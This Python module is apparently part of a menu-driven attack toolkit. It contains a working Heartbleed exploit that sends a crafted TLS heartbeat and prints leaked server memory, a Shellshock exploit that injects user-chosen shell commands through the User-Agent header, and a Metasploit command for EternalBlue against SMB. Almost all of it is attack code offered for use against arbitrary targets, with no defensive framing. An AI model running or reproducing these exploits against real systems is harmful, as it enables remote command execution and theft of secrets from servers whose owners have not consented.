import os
import socket
import struct
import requests
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

def heartbleed_exploit(target_ip, port=443):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, port))
        
        s.send(bytes.fromhex("16030200310100002d0302500bafbbb75ab83ef0ab9ae3f39c6315334137acfd6c181a2460dc4990939c7ac50b872f000006c014c00a0100"))
        
        data = s.recv(0x4000)
        
        if b'\x0e\xac\x0b' not in data and b'\x0f\xac\x0b' not in data:
            print(f"{Fore.RED}[-] Server doesn't support Heartbeat{Style.RESET_ALL}")
            return
            
        payload = bytes.fromhex("1803020003014000")
        s.send(payload)
        response = s.recv(0x4000)
        
        if len(response) > 7:
            print(f"{Fore.GREEN}[+] Heartbleed vulnerability detected!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[+] Received {len(response)} bytes:{Style.RESET_ALL}")
            print(response[:64].hex(' ')) 
        else:
            print(f"{Fore.RED}[-] System not vulnerable{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def exploits():
    clear_screen()
    print(f"\n{Fore.MAGENTA}{t('exploit_menu')}{Style.RESET_ALL}")
    print("01. EternalBlue (MS17-010)")
    print("02. ShellShock Exploit")
    print("03. Heartbleed Test")
    print("00. Back")
    choice = input(t("choose"))
    
    if choice == '01':  
        print(f"{Fore.YELLOW}Use: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; run'")
        input(f"\n{t('press_enter')}")
        
    elif choice == '02':  
        target = input("> Target URL: ")
        cmd = input("> Command to execute: ")
        
        headers = {'User-Agent': '() { :; }; echo; echo; /bin/bash -c "' + cmd + '"'}
        try:
            response = requests.get(target, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Result:{Style.RESET_ALL}\n{response.text[:500]}")
            else:
                print(f"{Fore.RED}[-] Error: {response.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        input(f"\n{t('press_enter')}")
        
    elif choice == '03':  
        target_ip = input("> Target IP: ")
        port = int(input("> Port (443): ") or 443)
        heartbleed_exploit(target_ip, port)
        input(f"\n{t('press_enter')}")
        
    elif choice == '00':
        return
    
    else:
        print(t("error"))
        time.sleep(1)